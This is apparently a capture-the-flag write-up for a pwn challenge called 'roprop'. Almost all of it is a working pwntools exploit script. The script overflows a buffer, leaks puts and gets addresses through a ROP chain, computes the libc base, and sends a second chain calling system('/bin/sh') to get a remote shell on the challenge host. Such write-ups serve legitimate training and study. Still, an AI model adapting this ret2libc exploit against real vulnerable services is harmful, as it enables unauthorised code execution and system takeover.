# Pwn

## roprop

> This is from the back Solar Designer times where you require rope to climb and get anything you want.
 nc pwn.darkarmy.xyz 5002

This is the exploit i used to get RCE.

```
from pwn import *

context.log_level = 'DEBUG'
context.update(arch="amd64", os="linux")

elf =  ELF("./roprop")

sh = remote("pwn.darkarmy.xyz", 5002)

payload =  b"A"*88
payload += p64(0x0000000000400963) # pop rdi ; ret
payload += p64(elf.got["puts"])
payload += p64(elf.sym["puts"])
payload += p64(0x0000000000400963) # pop rdi ; ret
payload += p64(elf.got["gets"])
payload += p64(elf.sym["puts"])
payload += p64(0x00000000004008b2) # main

for i in range(0,4):
    sh.recvline()

sh.sendline(payload)

puts_leak = u64(sh.recvuntil('\n', drop=True).ljust(8, b'\x00'))
gets_leak = u64(sh.recvuntil('\n', drop=True).ljust(8, b'\x00'))
libc_leak = puts_leak - 0x080a30

log.success(f"Leaked puts@libc: {hex(puts_leak)}")
log.success(f"Leaked gets@libc: {hex(gets_leak)}")
log.success(f"Leaked libc base: {hex(libc_leak)}")

for i in range(0,4):
    sh.recvline()

payload =  b"A"*88
payload += p64(0x0000000000400963)   # pop rdi ; ret
payload += p64(libc_leak + 0x1b40fa) # /bin/sh
payload += p64(libc_leak + 0x04f4e0) # system

sh.sendline(payload)

sh.interactive()
```